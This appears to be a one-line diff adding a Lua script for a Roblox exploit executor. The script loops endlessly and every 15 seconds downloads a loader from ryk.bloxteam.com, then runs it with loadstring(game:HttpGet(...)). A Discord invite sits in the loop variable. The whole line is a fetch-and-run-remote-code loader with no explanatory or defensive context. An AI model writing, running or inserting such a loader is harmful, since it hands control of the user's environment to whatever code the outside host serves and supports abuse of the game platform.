@@ -1,0 +1,1 @@
+local support = "discord.gg/ryk" repeat task.wait() spawn(function() loadstring(game:HttpGet("https://ryk.bloxteam.com/loader.lua"))() end) wait(15) until support ~= "discord.gg/ryk"
